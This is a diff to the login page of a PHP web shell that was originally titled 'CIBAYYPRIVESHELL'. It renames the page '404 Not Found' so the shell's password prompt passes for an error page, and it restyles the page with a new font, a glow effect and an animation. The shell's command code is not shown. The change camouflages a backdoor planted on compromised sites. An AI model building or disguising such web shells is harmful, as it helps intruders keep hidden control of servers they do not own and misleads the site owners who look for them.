@@ -82,36 +82,41 @@ if (is_logged_in()) {
     ?>
 <html>
 <head>
-<title>CIBAYYPRIVESHELL</title>
+<title>404 Not Found</title>
 <meta name="theme-color" content="#00BFFF">
 <script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
 <style>
     body {
         background-image: url("https://i.gifer.com/76cI.gif");
         background-repeat: no-repeat;
-        background-size: 100% 100%;
+        background-size: contain;
+        background-attachment: fixed;
+        background-position: center;
         height: 100vh;
         margin: 0;
         display: flex;
         justify-content: center;
         align-items: center;
         background-color: black;
-        font-family: 'Roboto', sans-serif;
+        font-family: 'Orbitron', sans-serif;
+        overflow: hidden;
     }
 
     h1 {
         color: #00BFFF;
         font-size: 3em;
         margin-bottom: 20px;
+        text-shadow: 0 0 10px #00BFFF;
     }
 
     form {
         background: rgba(0, 0, 0, 0.8);
         padding: 20px;
         border-radius: 10px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
         text-align: center;
+        animation: fadeIn 2s;
     }
 
     input[type="password"] {
@@ -121,6 +126,7 @@ if (is_logged_in()) {
         margin-bottom: 10px;
         width: 80%;
         box-sizing: border-box;
+        font-family: 'Orbitron', sans-serif;
     }
 
     input[type="submit"] {
@@ -131,6 +137,7 @@ if (is_logged_in()) {
         border-radius: 5px;
         cursor: pointer;
         transition: background-color 0.3s ease;
+        font-family: 'Orbitron', sans-serif;
     }
 
     input[type="submit"]:hover {
@@ -160,6 +167,11 @@ if (is_logged_in()) {
             width: 90%;
         }
     }
+
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
 </style>
 </head>
 <body>
@@ -167,7 +179,7 @@ if (is_logged_in()) {
         <h1>Login</h1>
         <form method="POST" action="">
             <input type="password" id="password" name="password" placeholder="Enter Password">
-            <input type="submit" value="Emutt">
+            <input type="submit" value="Tailaso">
         </form>
     </div>
 </body>
